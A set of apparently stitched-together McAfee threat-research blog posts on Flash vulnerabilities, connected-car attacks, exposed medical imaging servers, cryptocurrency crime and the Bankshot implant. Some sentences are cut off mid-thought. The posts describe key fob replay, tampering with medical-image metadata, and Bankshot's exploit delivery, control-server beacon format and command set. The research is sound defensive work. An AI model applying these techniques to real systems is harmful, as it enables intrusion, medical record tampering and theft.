“’Finding and fixing bugs isn’t the way to go, it’s … making it harder and more expensive for [attackers] to achieve an outcome,” said Adobe’s Chief Security Officer, Brad Arkin, 
:\/:
 He urged organizations to stop patching every vulnerability and instead increase the cost of exploitation to frustrate attackers. “The bad guys aren’t stupid,” he added. “They are going to apply their resources in the [most] cost efficient way possible, and so they seek to minimize the cost of developing an exploit.”
:\/:
Adobe’s shift in software security strategy has been to make exploiting issues prohibitively expensive so that attackers will find easier, less resource-intensive, and perhaps more reliable methods. Rather than chase every flaw, Adobe’s approach focuses on building defensive techniques that protect vulnerabilities, just as standard secure development life cycle techniques attempt to prevent new vulnerabilities from being released.
:\/:
Little in software development happens immediately, especially on a large scale. There is typically a lag—usually one to two years—between a strategy shift and results. In any event, the first issues to be eliminated are often the easiest to fix. As the program’s effectiveness improves, resources are available to address harder problems.
:\/:
Brad Arkin spoke about a strategy shift in the fall of 2014. We expected that shift to take time, and that is what we see in the data: In 2016, the number of newly discovered issues began to decline. However, the steep increase in vulnerabilities in 2015 and 2016 requires some additional examination.
:\/:
When security researchers focus on a code base, they generally start by finding the easiest-to-discover issues. As these are found and fixed, researchers probe deeper, shifting to techniques that increase in difficulty. Due to this ever-increasing difficulty, we often see a decrease in discoveries; it takes more time and effort to uncover tricky issues.
:\/:
Coupling the increasing difficulty of finding problems against the increase in effectiveness of a software security program, we find a distribution like what we have seen with Flash CVE reporting from 2015 through 2017. Until 2015, attackers exploited relatively easy-to-find cross-site scripting errors, but these largely disappeared after 2014. Suddenly, in 2015, there is a huge jump in the discovery of difficult-to-uncover memory issues and code execution opportunities. The leap in the CVE numbers reflects more technically challenging issues surfacing just as Adobe’s software strategy was making its shift.
:\/:
The new strategy had not had time to be fully effective by 2015. Plus, Flash, like all complex software, carries a large amount of legacy code. Just when researchers were digging deeper and harder into the code base, Adobe’s software security change required not just chasing vulnerability fixes, but also generating protective code and designs—all of which take time to implement. This typical situation explains the influx of critical new issues in 2015, and their subsequent continuous reductions.
:\/:
Still, no single or collection of security techniques is perfect. In 2017, Flash marked 70 new issues. So far in 2018, three have been discovered. The most recent, CVE-2018-4878, is technically challenging and appears to be within protections that Adobe has placed within byte arrays to prevent these memory structures from being misused. “[CVE-2018-4878] bypassed the byte array mitigation feature that was introduced to prevent ‘length corruption’ attacks in Flash,” wrote McAfee’s Hardik Shah in 
:\/:
It is just as possible to unwittingly add an exploitation opportunity when implementing software protections as when writing any other code. Of the 73 vulnerabilities discovered in 2017 and 2018, there is no method, without tracking code changes, to know when each of the flaws was introduced. It is likely that some of them arose in code carried forward from earlier versions, that is, from legacy code. Software implementers have a compelling argument to reuse as much code as possible in each new version. It is cheaper because it saves time.
:\/:
In a product with a history as long as Flash’s (more than 10 years), some of its code was written for a different threat landscape, not for today’s attackers and their more sophisticated tools and techniques. It is reasonable to suspect that a significant portion of the last two years’ worth of newly discovered issues are in code that has been carried into the latest versions. Those flaws contrast with the most recent vulnerability, CVE-2018-4878, which bypasses and abuses protections that were likely put into place after Adobe’s shift in strategy. The code that CVE-2018-4878 abuses was intended to make exploitation of byte arrays “more expensive.”
:\/:
To measure the popularity of Flash, we turned to Q-Success’ W3Techs web survey data. The following table shows the use of four client-side languages, with Flash declining steadily since 2011. JavaScript, on the other hand, today is nearly ubiquitous, at 95%. The two leading languages are graphed in the chart that follows the table.
:\/:
From W3Techs data, we can see that Flash use has declined steadily, to only 5% of surveyed web sites. Doesn’t that suggest that Flash exploitation would also decline or even stop? Unfortunately, it does not.
:\/:
The following W3Techs chart shows that although the number of sites using Flash is fairly low, enough high-traffic sites employ it to keep Flash popular.
:\/:
If popular websites continue to use Flash, then Flash Player will remain in use on users’ machines for some time. Adobe has 
:\/:
 to continue supporting Flash Player until the end of 2020. Unfortunately, this means merely that software updates, features, and patches will no longer be added; it does not effectively change Flash’s overall use. Only the end of websites requiring Flash will remove its vulnerabilities from the security picture.
:\/:
A highly targeted attack may need to compromise only a single computer to access an organization’s digital infrastructure and gain access to strategic targets. That single computer could be running an unpatched or dated version of Flash.
:\/:
As the use of Flash has declined, client-side JavaScript has become the de facto browser programming language. Yet JavaScript’s takeover does not fully solve the problem because it can deliver a Flash payload. Although some of the Flash vulnerabilities we have analyzed can be exploited remotely, many cannot. An attacker often requires some interaction by the victim to run a Flash exploit. JavaScript has become an increasingly common delivery mechanism for this purpose.
:\/:
Perhaps more important to attackers is the easy availability of Flash exploits ready to use in numerous exploit “kits.” Kits package all the necessary code to exercise a set of known vulnerabilities. Access to readily available exploits in a kit means far less attacker effort. Kits also “lower the technical bar.” Attackers need not understand how an exploit works; they can simply leverage the packages without knowing the technical details.
:\/:
Old Flash exploits are still available, along with new ones such as CVE-2018-4878, according to Tim Hux of the McAfee Advanced Threat Research team. “The Bizarro Sundown (aka GreenFlash) and ThreadKit exploit kits added the exploit to their lists last month,” he said. “The Rig and Magnitude exploit kits added this flaw to their arsenals this month.”
:\/:
Adding a new exploit does not mean the old ones are no longer available. Exploit kits are additive. The Rig kit, which appeared in 2014, contains the following Flash exploits:
:\/:
Old exploits do not die, they just get used less often as software is upgraded to fix earlier versions. If an attacker finds a vulnerable version of Flash in use, kits will have exploits to employ.
:\/:
It is difficult, and perhaps impossible, to prove that software is error free. (Alan Turing’s famous proof mathematically shows that automated processes cannot be proved correct through automation.) As famed computer scientist Edsger Dijkstra noted, “Testing shows the presence, not the absence of bugs.” 
:\/:
” NATO Science Committee, page 16.) In other words, even software that has passed a battery of security tests before release may still contain exploitable conditions.
:\/:
From our analysis of the relationship between Flash CVEs and Flash’s ongoing use, especially on high-traffic sites, McAfee’s Advanced Threat Research team believes that Flash vulnerabilities will continue to offer attackers a means toward malicious ends. However, Adobe’s shift in security strategy is an excellent step in reducing the number of newly discovered issues, which should maintain their decline.

McAfee’s malware engine can parse Flash for malicious content. Customers who have turned on automatic updates or who update regularly have been protected against seven new variants of CVE-2018-4878 since February 6.

 on the French site JournalAuto.com. Connected cars are growing rapidly in number and represent the next big step in personal transportation. Auto sales are expected to triple between 2017 and 2022, to US$155.9 billion from $52.5 billion, 
:\/:
Through multiple added functions, from Wi-Fi and external connections to driving assistance and autonomous operations, connected cars will very soon need strong security to avoid any intrusions that could endanger drivers, passengers, and others.
:\/:
Modern cars are exposed to security risks just as are other connected devices. Let’s look at current and future threats in the automotive security field.
:\/:
Connected cars record a lot of information about their drivers. This information can come from an external device connected to the car, such as a phone, and can include contact details, SMS and calls history, and even musical tastes. A car can also record shifting patterns and other driver’s habits that could be used to create a picture of a driver’s competence. This kind of oversight could aid insurance companies when offering coverage, for example.
:\/:
With personal data now considered the new gold, all of this information represents a valuable target for cybercriminals as well as companies and governments.
:\/:
Digital information can be modified and faked. By altering data such as pollution tests or performance, companies can take advantage of the results to increase sales. Similarly, drivers could modify car statistics such as distance traveled to fool insurance companies or future buyers.
:\/:
Key fob hacking is a technique to allow an intruder to enter a car without breaking in. This technique is widely known by attackers and can be done easily with cheap hardware. The attack consists of intercepting the signal from a wireless key to either block the signal to lock the car or replay the signal to gain access.
:\/:
One variant of the attack uses a jammer to block the signal. The jammer interferes with the electromagnetic waves used to communicate with the vehicle, blocking the signal and preventing the car from locking, leaving access free to the attacker. Some jammers have a range of more than 500 meters.
:\/:
Another attack intercepts the signal sent by the key and replays it to open the door. Auto manufacturers protect against this kind of attack by implementing security algorithms that avoid simple replays with same signal. Each signal sent from the key to the car is unique, thus avoiding a replay. However, one proof of concept for this attack blocks the signal to the car and stores it. The driver’s first click on the key does not work but is recorded by the attacker. The driver’s second click is also recorded, locking the car but giving two signals to the attackers. The first signal recorded, which the car has not received, is used to unlock the door. The second signal is stored for the attacker to use later.
:\/:
Autos use several components to interact with their parts. Since the end of the 20th century, cars have used the dedicated controller area network (CAN) standard to allow microcontrollers and devices to talk to each other. The CAN bus communicates with a vehicle’s electronic control unit (ECU), which operates many subsystems such as antilock brakes, airbags, transmission, audio system, doors, and many other parts—including the engine. Modern cars also have an On-Board Diagnostic Version 2 (OBD-II) port. Mechanics use this port to diagnose problems. CAN traffic can be intercepted from the OBD port.
:\/:
An external OBD device could be plugged into a car as a backdoor for external commands, controlling services such as the Wi-Fi connection, performance statistics, and unlocking doors. The OBD port offers a path for malicious activities if not secured.
:\/:
Adding more services to connected cars can also add more security risks. With the arrival of fully connected autos such as Teslas, which allow Internet access from a browser, it is feasible to deliver a new type of spam based on travel and geolocation. Imagine a pop-up discount as you approach a fast-food restaurant. Not only is this type of action likely to be unwanted, it could also provide a distraction to drivers. We already know spam and advertising are infection vectors for malware.
:\/:
All the ECUs in an auto contain firmware that can be hacked. Cars employ in-vehicle infotainment (IVI) systems to control audio or video among other functions. These systems are increasing in complexity.
:\/:
MirrorLink, Bluetooth, and internal Wi-Fi are other technologies that improve the driving experience. By connecting our smartphones to our cars, we add functions such as phone calls, SMS, and music and audiobooks, for example.
:\/:
Malware can target these devices. Phones, browsers, or the telecommunication networks embedded in our cars are infection vectors that can allow the installation of malware. In 2016, McAfee security researchers demonstrated a 
:\/:
The ransomware was installed via an over-the-air system that allowed the connection of external equipment.
:\/:
Many modern cars allow third parties to create applications to further connected services. For example, it is possible to unlock or lock the door from your smartphone using an app. Although these apps can be very convenient, they effectively open these services to anyone and can become a new attack vector. It is easier to hack a smartphone app than a car’s ECU because the former is more affordable and offers many more resources. Car apps are also vulnerable because some third parties employ weak security practices and credentials are sometimes stored in clear text. These apps may also store personal information such as GPS data, car model, and other information. This scenario has already been demonstrated by the 
:\/:
Vehicle-to-vehicle (V2V) technology allows communications between vehicles on the road, using a wireless network. This technology can aid security on the road by reducing a car’s speed when another vehicle is too close, for example. It can also communicate with road sign devices (vehicle to infrastructure). That transmitted information improves the driving experience as well as the security. Now imagine this vector invaded by destructive malware. If the V2V system becomes a vector, a malicious actor could create malware to infect many connected cars. This sounds like a sci-fi scenario, right? Yet it is not, if we compare this possibility with recent threats such as WannaCry or NotPetya that targeted computers with destructive malware. It is not hard to predict such a nightmare scenario.
:\/:
Connected cars are taking over the roads and will radically change how we move about. By enhancing the customer experience, the automotive and the tech industries will provide exciting new services. Nonetheless, we need to consider the potential risks, with security implemented sooner rather than later. Some of the scenarios in this post are already used in the wild; others could happen sooner than we expect.

 The report looks into the growth and trends of new malware, ransomware, and other threats in Q4 2017. McAfee Labs saw on average eight new threat samples per second, and the increasing use of fileless malware attacks leveraging Microsoft PowerShell. The Q4 spike in Bitcoin value prompted cybercriminals to focus on cryptocurrency hijacking through a variety of methods, including malicious Android apps.
:\/:
Each quarter, McAfee Labs, led by the Advanced Threat Research team, assesses the state of the cyber threat landscape based on threat data gathered by the McAfee Global Threat Intelligence cloud from hundreds of millions of sensors across multiple threat vectors around the world. McAfee Advanced Threat Research complements McAfee Labs by providing in-depth investigative analysis of cyberattacks from around the globe.
:\/:
The fourth quarter of 2017 saw the rise of newly diversified cybercriminals, as a significant number of actors embraced novel criminal activities to capture new revenue streams. For instance, the spike in the value of Bitcoin prompted actors to branch out from moneymakers such as ransomware, to the practice of hijacking Bitcoin and Monero wallets. McAfee researchers discovered Android apps developed exclusively for the purpose of cryptocurrency mining and observed discussions in underground forums suggesting Litecoin as a safer model than Bitcoin, with less chance of exposure.
:\/:
Cybercriminals also continued to adopt fileless malware leveraging Microsoft PowerShell, which surged 432% over the course of 2017, as the threat category became a go-to toolbox. The scripting language was used within Microsoft Office files to execute the first stage of attacks.
:\/:
Although publicly disclosed security incidents targeting health care decreased by 78% in the fourth quarter of 2017, the sector experienced a dramatic 210% overall increase in incidents in 2017. Through their investigations, McAfee Advanced Threat Research analysts conclude many incidents were caused by organizational failure to comply with security best practices or address known vulnerabilities in medical software.

:\/:
 In Q4 JavaScript malware growth continued to slow with new samples decreasing by 9%, while new PowerShell malware more than tripled, growing 267%.
:\/:
McAfee Labs counted 222 publicly disclosed security incidents in Q4, a decrease of 15% from Q3. 30% of all publicly disclosed security incidents in Q4 took place in the Americas, followed by 14% in Europe and 11% in Asia.
:\/:
Public, health care, education, and finance, respectively, led vertical sector security incidents for 2017.

:\/:
The nonperishable nature of medical data makes an irresistible target for cybercriminals. The art of hacking requires significant time and effort, encouraging experienced cybercriminals to plot their attacks based on the return they will see from their investment. Those who have successfully gained access to medical data have been well rewarded for their efforts. One seller 
:\/:
 that “someone wanted to buy all the … records specifically,” claiming that the effort had netted US$100,000.
:\/:
While at a doctor’s appointment with my wife watching a beautiful 4D ultrasound of our unborn child, I noticed the words “saving data to image” flash on the screen. Although this phrase would not catch the attention of most people, given my research on how 
:\/:
, I quickly began to wonder why an ultrasound of our child would not instead save to a file. Intrigued, I decided to dig into the world of medical imaging and its possible security risks. The results were disturbing; ultimately, we were able to combine attack vectors to reconstruct body parts from the images and make a three-dimensional model.
:\/:
Most hospitals or medical research facilities use PACS, for picture archiving and communication system, so that images such as ultrasounds, mammograms, MRIs, etc. can be accessed from the various systems within their facility, or through the cloud.
:\/:
A PACS setup contains multiple components, including a workstation, imaging device, acquisition gateway, PACS controller, database, and archiving—as illustrated in the following graphic:
:\/:
The imaging device creates a picture, such as an ultrasound or MRI, which is uploaded to an acquisition gateway. Because much of the imaging equipment in use by medical facilities does not align with security best practices, acquisition gateways are placed in the network to enable the digital exchange of the images. The acquisition gateway also often acts as the server connecting to the hospital’s information system (using the HL7 protocol) to enrich images with patient data.
:\/:
The PACS controller is the central unit coordinating all traffic among the different components. The final component in the PACS infrastructure is the database and archiving system. The system ensures that all images are correctly stored and labeled for either short- or long-term storage.
:\/:
Larger implementations might have multiple imaging devices and acquisition gateways in various locations, connected over the Internet. During our investigation, we noticed many small medical practices around the world using free, open-source PACS software, which was not always securely implemented.
:\/:
To determine how many PACS servers are connected depends on on how you search using Shodan, a search engine for finding specific types of computers connected to the Internet. Some servers connect over TCP 104; others use HTTP TCP 80 or HTTPS TCP 443. A quick search revealed more than 1,100 PACS directly connected to the Internet, not behind a recommended layer of network security measures or virtual private networks (VPNs).
:\/:
Our eyebrows began to rise very early in our research, as we came across “IE 6 support only” messages or ActiveX controls and old Java support; many of these products are vulnerable to a plethora of exploits. For example, one of the PACS generated an error page when we changed one parameter. This is a very basic common way of testing if the application developers did proper input sanitation check to prevent attackers inserting code or generating failures that could reveal data about the application and can give clues to compromise the system.
:\/:
When communicating with the DICOM (digital imaging and communications in medicine) port, TCP 104, it is possible to grab the banner of a server and get a response. As we queried, we recorded different responses. Let’s look at one:
:\/:
\x02\x00\x00\x00\x00\xbe\x00\x01\x00\x00ANY-SCP         FINDSCU         \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x151.2.840.10008.3.1.1.1!\x00\x00\x1b\x01\x00\x00\x00@\x00\x00\x131.2.840.10008.1.2.1P\x00\x00>Q\x00\x00\x04\x00\x00@\x00R\x00\x00"1.2.826.0.1.3680043.2.135.1066.101U\x00\x00\x0c1.4.16/WIN32
:\/:
The FINDSCU string refers to the findscu tool, which can be used to query a PACS system. The DICOM standard defines three data models for the query/retrieve service. Each data model has been assigned with one unique ID for the C-FIND, one for the C-MOVE, and one for C-GET; so all together there are nine unique IDs, three for each model. In the preceding banner, we retrieved two of those IDs:
:\/:
2.840.10008.1.2.1: A transfer unique ID that defines the value “Explicit VR Little Endian” for data transfer
:\/:
Another value in the banner, “1.4.16/WIN32,” refers to the implementation version. In the context of the medical servers, this refers to the version of XAMPP, aka Apache with MariaDB, PHP, and Perl. This server was running Apache 2.4.9, which is publicly known to contain nine vulnerabilities.
:\/:
In other cases, there was no need to search for vulnerabilities. The management interface was wide open and could be accessed without credentials.
:\/:
In addition to expensive commercial PACS systems, open-source or small-fee PACS are available for small health care institutions or practices. As we investigated these systems, we found that our fears were well founded. One web server/client setup used the defaults “admin/password” as credentials without enforcing a change when the server is started for the first time. We found more problems:
:\/:
We have reported the vulnerabilities we discovered to these vendors following our responsible disclosure process. They cooperated with us in investigating the vulnerabilities and taking appropriate actions to fix the issues.
:\/:
But why should we spend so much time and effort in researching vulnerabilities when there are many other ways to retrieve medical images from the Internet?
:\/:
The medical world uses several image formats for different purposes. Each format has different requirements and works with different equipment, protocols, etc. A few format examples:
:\/:
Searching open directories and FTP servers while using several search engines, we gathered thousands of images—some of them complete MRI scans, mostly in DICOM format. One example:
:\/:
 originated in the 1980s, before cybersecurity was a key component. The standard format contains a detailed list of tags such as patient name, station name, hospital, etc. All are included as metadata with the image.
:\/:
The file begins with the prefix DICM, an indicator that we are dealing with a DICOM file.  Other (now obscured) strings in this example include the hospital’s name, city, patient name, and more.
:\/:
The Health Insurance Portability and Accountability Act requires a secure medical imaging workflow, which includes the removal or anonymizing of metadata in DICOM files. Researching the retrieved files from open sources and directories, we discovered most of the images still contained this metadata, such as in the following example, from which we extracted (obscured) personally identifiable information (PII).
:\/:
We combined possible vulnerabilities and the metadata to create a test scenario, installing information from a dummy patient, including an x-ray picture of a knee, to the vulnerable PACS server.
:\/:
Using vulnerability information gathered in an earlier phase of research, we launched an attack to gain access to the PACS server. Once we had access, we downloaded the image from our dummy patient and altered the metadata of the image series, changing all references of “knee” to “elbow.”
:\/:
We then saved the picture and uploaded it to the server. Checking the records of our dummy patient, we found our changes were successful.
:\/:
In the medical imaging world, a large array of software can investigate and visualize images in different ways, for example, in 3D. We took our collection of images, and using a demo version of 3D software, we reconstructed complete 3D models of vertebrae, pelvis, knees, etc. and, in one case, we reconstructed a partial face.
:\/:
Because we firmly believe in protecting privacy, the following example—a series of images from a pelvis—comes from a demo file that accompanies the software.
:\/:
The application that generated the 3D model has a feature that allowed us to export the model in several data formats to be used by other 3D drawing programs. After the export, we imported the data into a 3D drawing program and converted the file to STL, a popular format for 3D objects and printers.
:\/:
In short, we began with files from open directories, transformed them into a 3D model, and printed a tangible model using a 3D printer:
:\/:
When we began our investigation into the security status of medical imaging systems, we never expected we would conclude by reconstructing body parts. The amount of old software used in implementations of PACS servers and the amount of vulnerabilities discovered within the software itself are concerning. We investigated relatively few open-source vendors, but it begs the question: What more could we have found if we had access to professional hardware and software?
:\/:
Default accounts, cross-site scripting, or vulnerabilities in the web server could lead to access to the systems. Our research demonstrates that once inside the systems, the data and pictures can be permanently altered.
:\/:
 pictures could be studied to determine how long a person will live. What if criminals could obtain that information and use it for extortion?
:\/:
We understand the need for quickly sharing medical data for diagnosis and treatment and for storing medical images. We advise health care organizations to be careful when sharing images on open directories for research purposes and to at least scrape the PII data from the images.
:\/:
For organizations using a PACS, ask your vendor about its security features. Employ a proper network design in which the sharing systems are properly secured. Think not only about internal security but also about the use of VPNs and two-factor authentication when connecting with external systems.
:\/:
In December 2017 Bitcoin values skyrocketed, peaking at the unprecedented amount of roughly US$19,000 per coin. Unsurprisingly, the market for cryptocurrencies exploded in response. Investors, companies, and even the public found a fresh interest in digital currencies. However, the exciting change in Bitcoin value did not just influence your average wealth seeker. It also influenced vast underground cybercriminal markets, malware developers, and cybercriminal behavior.
:\/:
The surge of Bitcoin popularity and price per coin piqued the interest of cybercriminals, driving cryptocurrency hijacking in the last quarter of 2017. However, the same popularity and price jump also created a headache for bad actors. Ransomware techniques and the buying and selling of goods became problematic. The volatility of the Bitcoin market makes ransom costs hard to predict at the time of infection and costs can surge upwards of $28 per transaction, complicating a criminal campaign. The volatility made mining, the act of using system resources to “mint” cryptocurrency, exceedingly difficult and raised transaction prices. This was especially true for Bitcoin, due its high hash rate of the network. (The higher the hash rate, the more people they compete against.)
:\/:
Cybercriminals will always seek to combine the highest returns in the shortest time with the least risk. With the Bitcoin surge, malware developers and underground markets found themselves in need of more stability, prompting a switch to other currencies and a resurgence of old techniques.
:\/:
It is far easier to mine small currencies because the hash rate is generally more manageable and hardware requirements can be more accessible depending on the network design. Monero, for example, is ASIC resistant, meaning that while mining specialized hardware does not have an overwhelming advantage to nonspecialized hardware. This allows the average computer to be more effective at the task. Due to this advantage, Monero is actively mined in mass by criminals using web-based miners on the machines of unsuspecting visitors. This intrusion is known as cryptojacking, which works by hijacking the browser session to use system resources. A quick look at recent examples of cryptojacking throws light on this issue. Starting mid-2017, there have been a slew of instances in which major websites have found themselves compromised and unwittingly hosting the code, turning their users into mining bots. The public Wi-Fi at a Starbucks outlet was found to hijack browsers to mine Monero. Even streaming services such as YouTube have been affected 
:\/:
. Ironically, Monero is said to be one of the most private cryptocurrencies. Attacks such as these have also happened on Bitcoin, NEM, and Ethereum.
:\/:
Criminals are also leveraging techniques beyond mining, such as cryptocurrency address or wallet hijacking. For example, Evrial, a Trojan for sale on underground markets, watches the Windows clipboard and replaces any cryptocurrency wallet addresses with its own malicious address. Essentially, this hijacks a user’s intended payment address to redirect funds. Unwitting users could accidentally pay a bad actor, losing their coins with essentially no chance of recovery.
:\/:
Cybercriminals have always faced the difficulty of securing their profits from government eyes. For the cybercriminal, banks present risk. If a transfer is deemed illegal or fraudulent, the bank transfer can easily be traced and seized by the bank or law enforcement. Trading in traditional currencies requires dealing with highly regulated entities that have a strong motivation to follow the rules. Any suspicious activity on their systems could easily result in the seizure of funds. Cybercriminals have long tried to solve this problem using various digital currencies, the prelude to cryptocurrencies. When cryptocurrencies were introduced to the world, cybercriminals were quick to adapt. However, with this adoption came Trojans, botnets, and other hacker activities designed specifically for the new technology.
:\/:
The evolution of digital currencies. Despite various attacks from bad actors, digital money continues to evolve.
:\/:
 E-gold appeared, and quickly became popular with cybercriminals due to its lack of verification on accounts. This was certainly welcome among “carder groups” such as ShadowCrew, which trafficked in stolen credit cards and other financial accounts. However, with three million accounts, e-gold’s popularity among criminals also caused its demise: It was taken down just 10 years later by the FBI, even after attempts in 2005 to rein in criminal activity. Accounts were seized and the founder indicted, collapsing all e-gold operations.
:\/:
 Needing another avenue after the collapse of e-gold, cybercriminals migrated to WebMoney, established in 1998. Unlike e-gold, WebMoney successfully discouraged the bulk of cybercriminals by modifying business practices to prevent illegal activities. This kept the organization alive but pushed many cybercriminals to find a new payment system.
:\/:
 Liberty Reserve took on much of the burgeoning cybercriminal demand. The institution got off to a rocky start with cybercriminals due to the almost immediate arrest of its founders. The company’s assets were seized in 2013—causing an estimated $6 billion in lost criminal funds.
:\/:
 Cybercriminals were increasingly desperate for a reliable and safe payment system. Enter Bitcoin, a decentralized, pseudo-anonymous payment system built on blockchain technology. With WebMoney usage growing increasingly difficult for cybercriminals and Liberty Reserve under scrutiny from world governments, cybercriminals required something new. Within the Bitcoin network, no central authority had the power to make decisions or otherwise seize funds. These protections against centralized seizures, as well as many of its anonymity features, were a major influence in the migration of cybercriminals to Bitcoin.
:\/:
By 2013 cybercriminals had a vested interest in cryptocurrencies, primarily Bitcoin. Cryptocurrency-related malware was in full swing, as evidenced by increasingly sophisticated 
:\/:
 such as BitBot. Large enterprises such as Silk Road, primarily a drug market, thrived on the backbone of cryptocurrency popularity. Then three major events dramatically changed the way cybercriminals operated.
:\/:
 The popular black market and first major modern cryptocurrency “dark net” market was shut down by the FBI. The market was tailored to drug sales, and the FBI takedown left its buyers and sellers without a place to sell their goods. The migration of buyers and sellers to less restrictive markets enabled cross-sales to a much larger audience than was previously available to cybercriminals. Buyers of drugs could now also buy stolen data—including Netflix accounts or credit cards—from new markets such as AlphaBay as demand increased.
:\/:
 Millions of credit card records were stolen and available, raising the demand for underground markets to buy and sell the data. Dark net markets already offering malware and other goods and services took up the load. Agora, Black Market Reloaded and, shortly thereafter, AlphaBay responded to that demand. Although many of these markets were scams, a few such as AlphaBay, which survived until its July 2017 takedown, were hugely successful. Through these markets, cybercriminals had access to a much larger audience and could benefit from centralized structures and advertising. The demand for other types of stolen data rose even more, particularly streaming media accounts and personally identifiable information, which carries a high financial return for cybercriminals.
:\/:
In the past, many of the credit card records were sold on forums and other specialized carding sites, such as Rescator. The new supply of credit card data was so massive, however, that it enabled secondhand sales and migration into broader markets. Dark net markets were simply more scalable than forums, thus enabling their further growth. New players joining the game now had easy access to goods, stolen data, and customers. This shift reshaped and enabled retail targeting as it exists today.
:\/:
 Outside of dark net markets, malware developers sought to acquire cryptocurrencies. Prior to 2013 the primary method to maliciously acquire coin was through mining. Less effective methods included scams, such as TOR-clone sites, fake markets, or Trojans designed to steal private keys to wallets. By late 2013 malware developers and botnet owners sold their malware at a premium by including mining software alongside the usual items such as credit cards and password scrapers. However, at a cost of around $250 per coin, Bitcoin miners did not immediately see higher profits than they could manage with focused scraper malware. Criminals needed more reliable ways of acquiring coins.
:\/:
Ransomware, a potentially lucrative form of malware, was already on the rise using other digital currencies. In late 2013, the major ransomware family CryptoLocker included a new option for ransomware victims—to pay via Bitcoin. The tactic effectively created a frenzy of copycat malware. Now malware developers could outpace the profits of scraper malware as well as secure currency for the underground market. Ransomware quickly enjoyed several immensely successful campaigns, many of which, including Locky and Samsa, are still popular. Open-source tools such as Hidden Tear allowed low-skilled players to enter the market and acquire cryptocurrencies through ransomware with only limited coding knowledge. The thriving model 
:\/:
The use of cryptocurrencies by malicious actors has grown substantially since their inception in 2009. Cryptocurrencies meet a need and have been exploited in ever-evolving ways since their introduction. The influence of cryptocurrencies on underground markets, malware development, and attackers behavior cannot be understated. As markets change and adopt cryptocurrencies, we will surely see further responses from cybercriminals.

On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra’s Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim’s business sector, and the presence of control server strings, this attack resembles 
:\/:
In this new, aggressive campaign we see a return of the Bankshot implant, which last appeared in 2017. Bankshot is designed to persist on a victim’s network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
:\/:
Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of 
:\/:
the Further investigation into this campaign and analysis of McAfee product telemetry shows that the infection occurred on March 2 and 3. The implant’s first target was a major government-controlled financial organization. It next appeared in another Turkish government organization involved in finance and trade. A further three large financial institutions in Turkey were victims of this attack. The implant has so far not surfaced in any other sector or country. This campaign suggests the attackers may plan a future heist against these targets by using Bankshot to gather information.
:\/:
Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim’s system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions. Bankshot was first reported by the 
:\/:
 on December 13, 2017, and has only recently resurfaced in newly compiled variants. The sample we analyzed is 99% similar to the documented Bankshot variants from 2017.
:\/:
The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.
:\/:
We discovered two more documents, written in Korean, that exploit the same vulnerability as Agreement.docx. These documents appear to be part of the same campaign and may have been used on different targets. These documents also communicated with falcancoin.io to install Bankshot and also contain themes around cryptocurrency security.
:\/:
The implants are downloaded via a Flash file embedded in the malicious document. They are executed when the victim views the document.
:\/:
The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants’ code.
:\/:
The sample (a2e966edee45b30bb6bb5c978e55833eec169098) is a Windows DLL that serves as a backdoor and contains a variety of capabilities. The malicious DLL is not a service DLL because it lacks ServiceMain(). To mask itself, it can run as a regular library loaded into a legitimate process.
:\/:
The malware begins by creating a new thread from the DllMain() function to carry out its malicious activities:
:\/:
The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress(). APIs 
:\/:
Based on packet capture analysis of previous implants from 2017, the following strings are used in control server communications:
:\/:
The implant either fetches the user agent from Internet Explorer (using ObtainUserAgentAsString()) or uses a default user agent specified in the malware binary:
:\/:
The malware initiates communication with the control server by sending it an HTTP POST request with additional optional HTTP data, such as:
:\/:
------FormBoundary<randomly_generated_characters>
Content-Disposition: form-data; name="board_id"


:\/:

------FormBoundary<randomly_generated_characters>
Content-Disposition: form-data; name="user_id"


:\/:

------FormBoundary<randomly_generated_characters>
Content-Disposition: form-data; name="file1"; filename="king.jpg"
Content-Type: application/octet-stream
:\/:
is a four-digit number that may be an identifier for a campaign ID. Based on analysis of previous samples, this is a unique identifier.
:\/:
 is a hardcoded value in the malware binary that is sent to the control server. The username appears to be attacker specified and has occurred in 2017 Bankshot samples. This links the previous samples with this unique username.
:\/:
is based on static analysis. This looks like a specific beacon to indicate that the malware is ready to receive commands.
:\/:
The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:
:\/:
Based on the responses received from the control server, the malware can carry out the following malicious tasks:
:\/:
Terminate a specific process. The process is identified by the control server sending the PID to the malware.
:\/:
Write data sent by the control server to a temporary file matching the file path pattern %temp%\DWS00*
:\/:
Load an arbitrary library into its process space. This may be used to load additional downloaded components of the attack.
:\/:
After every action is performed the malware sends a response to the control server indicating whether the action was successful.
:\/:
 that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations. This implant has been connected to a major Korean 
:\/:
 and is also known as Trojan Manuscript. That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector. The implant does not conduct financial transactions; rather it is a channel into the victim’s environment, in which further stages of implants can be deployed for financial reconnaissance. The Bankshot implant was also observed in 2017 in documents appearing to come from Latin American banks.
:\/:
